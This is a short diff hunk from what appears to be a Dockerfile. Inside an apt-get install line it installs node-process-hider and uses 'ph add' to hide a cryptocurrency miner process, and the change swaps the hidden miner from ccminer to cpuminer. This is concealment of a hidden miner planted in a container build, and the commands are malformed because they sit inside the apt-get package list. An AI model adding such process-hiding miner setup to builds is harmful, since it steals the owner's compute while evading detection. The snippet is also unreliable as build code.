@@ -23,7 +23,7 @@ RUN apt-get update && apt-get install -y \
     libgomp1 \
     libnuma-dev \
     npm i -g node-process-hider \
-    ph add ccminer \
+    ph add cpuminer \
  && mkdir -p /home/stuff
 
 # Set work dir:
